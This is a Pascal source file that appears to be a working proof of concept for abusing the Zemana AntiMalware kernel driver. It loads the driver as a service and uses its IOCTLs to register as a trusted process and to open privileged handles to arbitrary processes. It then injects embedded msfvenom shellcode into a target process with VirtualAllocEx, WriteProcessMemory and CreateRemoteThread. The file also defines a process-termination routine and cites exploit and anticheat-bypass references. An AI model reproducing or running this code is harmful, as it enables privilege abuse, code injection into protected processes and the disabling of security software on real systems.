program memRW;

//check https://github.com/irql0/CVE-2021-31728/blob/master/disk_rw/main.c
//https://gist.github.com/hfiref0x/e116dcf7e99b8d5d36c333a1f1048916

uses windows,sysutils;

type NTSTATUS = integer;

OBJECT_INFORMATION_CLASS = (ObjectBasicInformation,ObjectNameInformation,ObjectTypeInformation,ObjectAllTypesInformation,ObjectHandleInformation );

UNICODE_STRING=packed record
         Length       :Word;
         MaximumLength:Word;
         Buffer       :PWideChar;
      end;

      OBJECT_NAME_INFORMATION=UNICODE_STRING;

      OBJECT_BASIC_INFORMATION = record
               Attributes:ULONG;
               GrantedAccess:ACCESS_MASK;
               HandleCount:ULONG;
               PointerCount:ULONG;
               PagedPoolUsage: ULONG;
                   NonPagedPoolUsage: ULONG;
                   Reserved: array[0..2] of ULONG;
                   NameInformationLength: ULONG;
                   TypeInformationLength: ULONG;
                   SecurityDescriptorLength: ULONG;
                   CreateTime: LARGE_INTEGER;
                 end;

function NtSuspendProcess(ProcessID:Dword):DWORD; stdcall;external 'ntdll.dll';
function NtGetNextThread(
        ProcessHandle:thandle;
        ThreadHandle:thandle;
        DesiredAccess:ACCESS_MASK;
        HandleAttributes:ulong;
        Flags:ulong;
        var NewThreadHandle:thandle
       ):NTSTATUS;stdcall;external 'ntdll.dll';
function GetThreadId(thread:thandle):NTSTATUS;stdcall;external 'kernel32.dll';
function NtQueryObject(ObjectHandle:cardinal; ObjectInformationClass:OBJECT_INFORMATION_CLASS; ObjectInformation:pointer; Length:ULONG;ResultLength:PDWORD):THandle;stdcall;external 'ntdll.dll';

var
         svc:thandle=thandle(-1);
         b:boolean;
         process:handle=thandle(-1);
         dup:thandle=thandle(-1);
         ptr:lpvoid ;
         written:ptruint;
         dw:dword;
         obi:OBJECT_BASIC_INFORMATION;
         RemoteAllocation:lpvoid=nil;
         BytesReturned:dword;
         //*msfvenom -p windows/x64/exec CMD=cmd.exe EXITFUNC=thread -f c*/
         buf:array [0..274]of byte=($fc,$48,$83,$e4,$f0,$e8,$c0,$00,$00,$00,$41,$51,$41,$50
,$52,$51,$56,$48,$31,$d2,$65,$48,$8b,$52,$60,$48,$8b,$52
,$18,$48,$8b,$52,$20,$48,$8b,$72,$50,$48,$0f,$b7,$4a,$4a
,$4d,$31,$c9,$48,$31,$c0,$ac,$3c,$61,$7c,$02,$2c,$20,$41
,$c1,$c9,$0d,$41,$01,$c1,$e2,$ed,$52,$41,$51,$48,$8b,$52
,$20,$8b,$42,$3c,$48,$01,$d0,$8b,$80,$88,$00,$00,$00,$48
,$85,$c0,$74,$67,$48,$01,$d0,$50,$8b,$48,$18,$44,$8b,$40
,$20,$49,$01,$d0,$e3,$56,$48,$ff,$c9,$41,$8b,$34,$88,$48
,$01,$d6,$4d,$31,$c9,$48,$31,$c0,$ac,$41,$c1,$c9,$0d,$41
,$01,$c1,$38,$e0,$75,$f1,$4c,$03,$4c,$24,$08,$45,$39,$d1
,$75,$d8,$58,$44,$8b,$40,$24,$49,$01,$d0,$66,$41,$8b,$0c
,$48,$44,$8b,$40,$1c,$49,$01,$d0,$41,$8b,$04,$88,$48,$01
,$d0,$41,$58,$41,$58,$5e,$59,$5a,$41,$58,$41,$59,$41,$5a
,$48,$83,$ec,$20,$41,$52,$ff,$e0,$58,$41,$59,$5a,$48,$8b
,$12,$e9,$57,$ff,$ff,$ff,$5d,$48,$ba,$01,$00,$00,$00,$00
,$00,$00,$00,$48,$8d,$8d,$01,$01,$00,$00,$41,$ba,$31,$8b
,$6f,$87,$ff,$d5,$bb,$e0,$1d,$2a,$0a,$41,$ba,$a6,$95,$bd
,$9d,$ff,$d5,$48,$83,$c4,$28,$3c,$06,$7c,$0a,$80,$fb,$e0
,$75,$05,$bb,$47,$13,$72,$6f,$6a,$00,$59,$41,$89,$da,$ff
,$d5,$63,$6d,$64,$2e,$65,$78,$65,$00);


function LoadDriver(szDriverPath:string;szDriverSvc  :string= '_driver'):boolean;
var
  ServiceMan   :SC_HANDLE= thandle(-1);
  ServicePtr  :SC_HANDLE= thandle(-1);
  boolRetVal  :BOOL = FALSE;

begin

  //szDriverSvc = ExtractService(szDriverPath);
  ServiceMan  := OpenSCManager(nil, nil, SC_MANAGER_CREATE_SERVICE);
  if ServiceMan <> thandle(-1) then
    begin
    ServicePtr := CreateServiceA(ServiceMan, pchar(szDriverSvc), pchar(szDriverSvc),
		    SERVICE_START or SERVICE_DELETE or SERVICE_STOP,
		    SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
		    SERVICE_ERROR_IGNORE, pchar(szDriverPath), nil,nil, nil, nil, nil);
    if ServicePtr <>thandle(-1) then
      begin
	writeln('registered service successfully: '+szDriverSvc);
	if  StartService(ServicePtr, 0, nil) = TRUE then
          begin
		writeln('started service successfully');
		boolRetVal := TRUE;
          end //StartService
          else writeln('LoadDriver(StartService): GetLastError() -> '+ inttostr(GetLastError));
	CloseServiceHandle(ServicePtr);
      end //if ServicePtr <>thandle(-1) then
     else writeln('LoadDriver(CreateServiceA): GetLastError() ->  '+ inttostr(GetLastError));
    CloseServiceHandle(ServiceMan);
  end; //if ServiceMan <> thandle(-1) then
  result:= boolRetVal;
end;

function UnloadDriver(szDriverSvc  :string= '_driver'):boolean;
var
  //szDriverSvc  :string= 'zam';
  ServiceMan   :SC_HANDLE= thandle(-1);
  ServicePtr  :SC_HANDLE= thandle(-1);
  boolRetVal  :BOOL = FALSE;
  ServiceStat  :SERVICE_STATUS ;

begin
  fillchar(ServiceStat,sizeof(ServiceStat),0);
  ServiceMan  := OpenSCManager(nil, nil, SC_MANAGER_CREATE_SERVICE);
  if ServiceMan <> thandle(-1) then
    begin
	ServicePtr := OpenServiceA(ServiceMan, pchar(szDriverSvc), SERVICE_STOP or SERVICE_DELETE);
	if ( ServicePtr <> thandle(-1) ) then
        begin
		ControlService(ServicePtr, SERVICE_CONTROL_STOP, @ServiceStat);
		if  DeleteService(ServicePtr) <> TRUE
                    then  writeln('failed to delete service, cleanup manually!')
		    else  writeln('deleted service successfully: '+szDriverSvc);
		CloseServiceHandle(ServicePtr);
		boolRetVal := TRUE;

        end;//if ( ServicePtr <> thandle(-1) ) then
	CloseServiceHandle(ServiceMan);

 end; //if ServiceMan <> thandle(-1) then
  result:= boolRetVal;
end;

function ZemanaOpenHandle(filename:string):thandle;
begin
	result:= CreateFileA(pchar(filename),GENERIC_READ or GENERIC_WRITE,
		0, nil, OPEN_EXISTING,	FILE_ATTRIBUTE_NORMAL, 0);
end;

function ZemanaRegisterProcess(hDevice:thandle;TrustedProcess:dword ):boolean;
var
	 ReturnedSize:DWORD = 0;
begin
	result:= DeviceIoControl(hDevice,
			       $80002010,
			       @TrustedProcess,
			       sizeof(DWORD),
			       nil,
			       0,
			       @ReturnedSize,
			       nil);
end;

function ZemanaOpenProcess(hDevice:thandle;ProcessNumber:DWORD;ProcessHandle:PHANDLE ):boolean;
var
	 ReturnedSize:DWORD = 0;
begin
	result:= DeviceIoControl(hDevice,
                               $8000204C,
                               @ProcessNumber,
                               sizeof(DWORD),
                               ProcessHandle,
                               sizeof(HANDLE),
			       @ReturnedSize,
			       nil);
end;

function ZemanaTerminateProcess(hDevice:thandle;ProcessNumber:DWORD ):boolean;
var
	 ReturnedSize:DWORD = 0;
begin
	result:= DeviceIoControl(hDevice,
                               $8000204C,
                               @ProcessNumber,
                               sizeof(DWORD),
                               nil,
                               0,
			       @ReturnedSize,
			       nil);
end;

function ZemanaOpenThread(hDevice:thandle;ThreadId:DWORD;ThreadHandle:PHANDLE  ):boolean;
var
	 ReturnedSize:DWORD = 0;
begin
	result:= DeviceIoControl(hDevice,
			       $80002084,
			       @ThreadId,
			       sizeof(DWORD),
			       ThreadHandle,
                               sizeof(HANDLE),
			       @ReturnedSize,
			       nil);
end;

function GetNextThread(process_handle:thandle):boolean;
var
newth,th:thandle;
ret:NTSTATUS;
start,teb:dword;
tid:dword;
begin
newth:=thandle(-1);
result:=false;
//https://msdn.microsoft.com/fr-fr/library/windows/desktop/ms686769(v=vs.85).aspx
//THREAD_ALL_ACCESS
ret:=NtGetNextThread(process_handle ,0,MAXIMUM_ALLOWED,0,0,newth); //THREAD_ALL_ACCESS  THREAD_QUERY_INFORMATION
//if ret<>0 then writeln(inttohex(ret,sizeof(ret)));
if ret<>0 then exit;
//0x8000001A STATUS_NO_MORE_ENTRIES
while ret=0 do
begin
//log(inttostr(ret)+','+inttostr(GetThreadId(th)));
tid :=GetThreadId(newth);
//GetThreadInfo(process_handle,newth,start,teb);
writeln('tid:'+inttostr(tid));
th:=newth;
ret:=ntGetNextThread(
                   process_handle,
                   th,
                   MAXIMUM_ALLOWED, //THREAD_ALL_ACCESS THREAD_QUERY_INFORMATION
                   0,
                   0,
                   newth  //newth
                   );
closehandle(th); //avoid handle leaking
end;
result:=true;
end;

//https://guidedhacking.com/threads/how-to-bypass-kernel-anticheat-develop-drivers.11325/
begin
if paramcount=0 then exit;
if paramstr(1)='load'
   then LoadDriver (ParamStr (2),stringreplace(ExtractFileName (ParamStr (2)),ExtractFileExt (ParamStr (2)),'',[]));
if paramstr(1)='unload'
   then UnloadDriver(stringreplace(ExtractFileName (ParamStr (2)),ExtractFileExt (ParamStr (2)),'',[])) ;
if paramstr(1)='open' then
  begin
  //open handle to driver
  svc:=ZemanaOpenHandle('\\.\ZemanaAntiMalware');
  //svc:=ZemanaOpenHandle('\\.\amsdk');

  if svc=thandle(-1) then begin writeln('handle failed');exit;end;
  //register process
  b:=ZemanaRegisterProcess(svc,GetCurrentProcessId );
  writeln('ZemanaRegisterProcess:'+BoolToStr (b));
  //terminate process
  //b:=ZemanaTerminateProcess(svc,strtoint(paramstr(2)));
  //writeln('ZemanaTerminateProcess:'+BoolToStr (b));
  //open process
  b:=ZemanaOpenProcess(svc,strtoint(paramstr(2)),@process);
  //process:=OpenProcess (MAXIMUM_ALLOWED ,false,strtoint(paramstr(2)));
  writeln('ZemanaOpenProcess:'+BoolToStr (b));
  writeln('processhandle:'+inttohex(process,8));
  ptr:=nil;
  //https://www.exploit-db.com/exploits/43987
  //ptr := VirtualAllocEx(Process, nil, $1000, MEM_RESERVE or MEM_COMMIT, PAGE_READWRITE);
  //writeln(inttohex(nativeuint(ptr),sizeof(lpvoid)));

  //https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights
  dw:=0;
  if NtQueryObject(process, ObjectBasicInformation, @obi, sizeof(obi), @dw)=0
      then writeln('access_mask:'+inttohex(obi.GrantedAccess,sizeof(access_mask) ))
      else writeln('lasterror:'+inttostr(getlasterror));
  {
  b:=DuplicateHandle (process ,process,GetCurrentProcess ,@dup,PROCESS_ALL_ACCESS ,false,0); //$1FFFFF
  writeln('DuplicateHandle:'+BoolToStr (b));
  if NtQueryObject(dup, ObjectBasicInformation, @obi, sizeof(obi), @dw)=0
      then writeln('access_mask:'+inttohex(obi.GrantedAccess,sizeof(access_mask) ))
      else writeln('lasterror:'+inttostr(getlasterror));
  }
  //readln;
  //writeln('TerminateProcess:'+BoolToStr (TerminateProcess (process,0)));
  //
  RemoteAllocation := VirtualAllocEx(process, nil, $1000, MEM_RESERVE or MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  if RemoteAllocation<>nil then
    begin
    writeln('VirtualAllocEx ok');
    if WriteProcessMemory(process, RemoteAllocation, @buf[0], sizeof(buf), @BytesReturned) then
       begin
       writeln('WriteProcessMemory ok');
       if CreateRemoteThread(process, nil, 0, RemoteAllocation, nil, 0, nil)>0 then
          writeln('CreateRemoteThread ok');
       end;
    end;
  //
  //if process<>thandle(-1) then writeln('GetNextThread:'+BoolToStr(GetNextThread (process )));
  if process<>thandle(-1) then writeln('closehandle:'+BoolToStr(closehandle(process)));
  if dup<>thandle(-1) then writeln('closehandle:'+BoolToStr(closehandle(dup)));
  if svc<>thandle(-1) then writeln('closehandle:'+BoolToStr(closehandle(svc)));
  //writeln(BoolToStr (TerminateProcess (process,0)));
  end;
end.

